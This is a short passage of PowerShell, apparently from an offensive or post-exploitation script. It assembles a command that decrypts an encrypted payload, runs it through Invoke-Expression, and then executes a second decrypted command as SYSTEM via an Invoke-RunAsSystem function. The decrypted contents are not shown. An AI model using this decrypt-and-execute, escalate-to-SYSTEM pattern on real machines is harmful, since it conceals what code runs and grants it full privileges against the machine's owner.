            $Command = "$Decrypt ; Invoke-Decrypt $ElevateKey $ElevateIV $ElevateData | IEX ; Invoke-RunAsSystem -Command (Invoke-Decrypt $Key $IV $Data) | Out-String"
            Start-Sleep -Seconds 2
        }
        else {
